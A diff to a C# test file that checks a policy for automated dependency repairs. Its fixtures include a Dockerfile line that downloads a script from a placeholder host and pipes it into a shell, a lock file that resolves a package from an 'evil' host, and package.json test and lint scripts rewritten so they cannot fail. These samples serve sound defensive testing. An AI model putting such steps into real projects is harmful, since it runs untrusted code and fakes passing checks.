@@ -47,4 +47,19 @@ public sealed class DependencySourcesTests
     [Fact]
     public void A_repair_that_pipes_a_script_into_a_shell_is_refused() =>
         RepairPolicy.Refusal([new PatchedFile("Dockerfile", "FROM node:22\nRUN wget -qO- https://example.invalid/i.sh | sh\n")]).Should().Contain("outside a registry");
+
+    [Theory]
+    [InlineData("    \"test\": \"exit 0\",")]
+    [InlineData("    \"test:unit\": \"echo skipped\",")]
+    [InlineData("    \"lint\": \"eslint . || true\",")]
+    public void A_script_that_judges_the_code_is_never_made_unable_to_fail(string line) =>
+        DependencySources.ScriptWeakening("package.json", [line]).Should().Contain("unable to fail");
+
+    [Fact]
+    public void A_script_that_still_checks_passes() =>
+        DependencySources.ScriptWeakening("package.json", ["    \"test\": \"mocha --reporter dot\","]).Should().BeNull();
+
+    [Fact]
+    public void A_repair_that_points_a_lock_file_outside_a_registry_is_refused() =>
+        RepairPolicy.Refusal([new PatchedFile("package-lock.json", "{\n  \"resolved\": \"https://evil.example.invalid/left-pad-1.3.0.tgz\"\n}\n")]).Should().Contain("not a registry");
 }
